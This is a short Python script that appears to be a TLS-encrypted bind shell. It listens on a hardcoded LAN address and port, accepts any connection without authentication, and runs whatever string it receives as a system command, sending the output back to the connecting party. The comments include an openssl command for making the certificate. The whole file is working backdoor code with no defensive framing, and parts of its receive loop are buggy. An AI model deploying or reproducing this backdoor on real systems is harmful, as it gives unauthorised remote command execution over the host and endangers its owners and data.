import socket
import ssl
import PySimpleGUI as sg
from subprocess import run
import sys

def interact(cert ,key ,host ,port):

    #Needs cert and key generated:
    #openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -sha256 -days 365


    context = ssl.SSLContext()
    context.load_cert_chain(certfile=cert, keyfile=key)

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0) as sock:
        sock.bind((host, port))
        sock.listen(5)
        with context.wrap_socket(sock, server_side=True) as ssock:
            while 1:
                conn, addr = ssock.accept()
                print('Connected by', addr)
                while 1:
                    recieve = conn.recv(1024)
                    if (recieve  !=0):
                        break
                    print(f"Recieved: {recieve}")
                recieve=recieve.decode()
                command_split=recieve.split(" ")
                command = run(command_split, capture_output=True).stdout
                conn.send(command)
def get_host_info(host):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    host=(s.getsockname()[0])
    s.close()
    return host
if __name__=="__main__":
    port = 4000
    host= '192.168.237.129'
    cert="./cert.pem"
    key="./key.pem"

    interact(cert ,key, host ,port)
#    setup_list=setup()
#    host=setup_list[0]
#    port=setup_list[1]